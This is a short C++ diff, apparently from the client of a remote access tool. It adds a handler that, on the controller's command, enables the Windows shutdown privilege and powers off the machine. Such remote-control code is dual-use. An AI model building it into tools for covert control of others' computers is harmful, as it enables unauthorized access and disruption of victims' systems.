@@ -28,13 +28,25 @@ void CKernelManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
 	}
 	case CLIENT_REMOTE_MESSAGE_REQUIRE:
 	{
-
+ 
 		//启动一个线程
 		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
 			(LPTHREAD_START_ROUTINE)RemoteMessageProcedure,
 			NULL, 0, NULL);
 
 
+		break;
+	}
+	case CLIENT_SHUT_DOWN_REQUIRE:
+	{
+
+		IsToken = CLIENT_SHUT_DOWN_REPLY;
+		m_IocpClient->OnSending((char*)&IsToken, 1);
+		Sleep(1);
+
+		EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_SHUTDOWN_NAME);
+		ShutdownSystem();
+		EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_SHUTDOWN_NAME);
 		break;
 	}
 	}
